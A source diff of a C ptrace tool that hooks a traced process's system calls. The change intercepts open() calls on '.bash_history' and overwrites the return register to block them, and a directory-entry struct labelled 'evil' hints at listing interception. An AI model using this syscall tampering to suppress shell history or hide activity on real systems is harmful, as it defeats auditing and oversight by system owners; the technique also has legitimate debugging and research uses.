@@ -26,16 +26,16 @@
 #define VERSION "v0.01"
 #define AUTHOR "pasv (pasvninja@gmail.com)"
 
-#include <linux/user.h>
+//#include <linux/user.h>
 //#include <linux/dirent.h> //also evil
 #include <linux/types.h>
 #include <sys/reg.h> //i hate this file
+#include <sys/user.h>
 #include <unistd.h>
 #include <sys/syscall.h>
 #include <stdio.h>
 #include <sys/ptrace.h>
 #include <signal.h>
-#include <linux/user.h>
 //#include <sys/types.h>
 #include <sys/wait.h>
 #include <asm/unistd.h>
@@ -50,6 +50,7 @@ struct linux_dirent64 {
 	unsigned char d_type;
 	char d_name[0];
 };
+
 
 void getdata(pid_t child, long addr, char *str, int len) {
     char *laddr;
@@ -168,22 +169,37 @@ int syscall_open(int pid, struct user_regs_struct regs) {
 	long path_addr;
 	char *path= (char *)malloc(1000);
 	int flags;
+	//regs.eax = 0;
 	static int in_syscall;
+	static int is_match;
 	if(in_syscall == 0) {
 		in_syscall=1;
 		path_addr=ptrace(PTRACE_PEEKUSER, pid, EBX*4, 0);
 		flags=ptrace(PTRACE_PEEKUSER, pid, ECX*4, 0);
 		p_getstr(pid, path, path_addr);
+		
+		if(strstr(path, ".bash_history") != NULL) {
+		    printf("[PID:%d] file access spotted, now blocking it\n", pid);
+		    is_match = 1;
+		    //putdata(pid, path_addr, "/noexist\0", 9)
+		    
+		}
 		printf("open(%s,%x)!\n", path, flags);
 	}
-	else {
-		in_syscall=0;
+	else { // this is the syscall exiting
+	    if(is_match) {
+		regs.eax=0;
+		ptrace(PTRACE_SETREGS, pid, NULL, &regs);
+		is_match=0;
+	    }
+	    in_syscall=0;
 	}
 }
 
 int syscall_fork(int pid, struct user_regs_struct regs) {
 
 }
+
 /**************************End of syscall handlers*********************/
 
 int hookem(int pid) {
